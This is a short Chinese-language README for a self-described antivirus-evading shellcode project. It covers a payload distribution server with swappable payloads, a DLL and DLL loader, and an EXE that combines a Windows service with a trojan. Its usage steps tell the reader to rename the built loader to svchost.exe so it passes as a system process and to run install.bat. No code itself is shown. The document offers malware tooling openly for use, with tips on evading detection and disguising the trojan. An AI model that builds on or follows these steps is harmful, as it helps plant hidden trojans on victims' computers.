# shellcode
我的免杀shellcode
Blog: https://9bie.org
# server.py

payload分发服务器，可以动态修改payload
下次重启时才会引用
# Dll
Dll版本的主体，配合DLLLOADER使用

# DLLLOADER

一个单纯的服务器文件，配合DLL使用，推荐使用GCC编译，免杀效果更佳
## 使用方式
把DLL编译出来的invoke.dll和此项目编译出来的文件（改名为svchost.exe），和此项目目录下的install.bat放置同一目录 ，双击Install.bat即可

# ServiceExE
EXE版本的服务和木马二合一的。方法同上
编译出来的svchost.exe和installed.bat同目录即可